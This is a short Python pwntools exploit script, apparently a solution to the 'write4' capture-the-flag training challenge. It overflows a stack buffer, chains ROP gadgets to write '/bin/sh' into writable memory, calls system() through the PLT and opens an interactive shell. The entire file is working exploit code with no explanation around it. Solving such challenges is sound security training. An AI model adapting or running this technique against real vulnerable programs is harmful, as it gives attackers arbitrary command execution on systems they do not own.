from pwn import *

p = process("./write4")
pop_pop_ret_address = 0x0000000000400890
mov_ret_address = 0x0000000000400820
write_start_address = 0x006010f0
system_plt_address = 0x00000000004005E0
pop_rdi_ret = 0x0000000000400893
payload = flat(["A"*(0x20+8), pop_pop_ret_address, write_start_address, "/bin/sh\x00", mov_ret_address, pop_rdi_ret, write_start_address, system_plt_address], word_size=64)
p.sendline(payload)
p.interactive()
